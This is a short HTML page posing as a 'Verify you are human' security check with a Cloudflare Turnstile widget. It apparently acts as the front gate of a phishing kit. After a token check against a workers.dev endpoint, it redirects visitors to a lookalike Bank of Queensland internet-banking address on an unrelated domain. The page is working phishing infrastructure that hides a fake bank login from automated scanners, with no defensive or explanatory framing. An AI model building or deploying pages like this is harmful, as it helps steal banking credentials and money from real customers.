<!DOCTYPE html>
<html>
<head>
  <title>Security Check</title>

  <!-- Turnstile script (loads the widget) -->
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</head>

<body>

<h2>Verify you are human</h2>

<!-- 1. FORM + TURNSTILE WIDGET -->
<form id="myForm">

  <div class="cf-turnstile"
       data-sitekey="0x4AAAAAADviox3Tz8fVZXRI">
  </div>

  <button type="submit">Continue</button>

</form>

<!-- 2. JAVASCRIPT (same file) -->
<script>
document.getElementById("myForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const token = document.querySelector('[name="cf-turnstile-response"]').value;

  if (!token) {
    alert("Please complete verification");
    return;
  }

  const res = await fetch("https://hcaptcha-verify.kamitassin.workers.dev", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ token })
  });

  const data = await res.json();

  if (data.success) {
    window.location.href = "https://ib.boq.com.au.autocheck.click/mybq/index.html";
  } else {
    alert("Verification failed");
  }
});
</script>

</body>
</html>
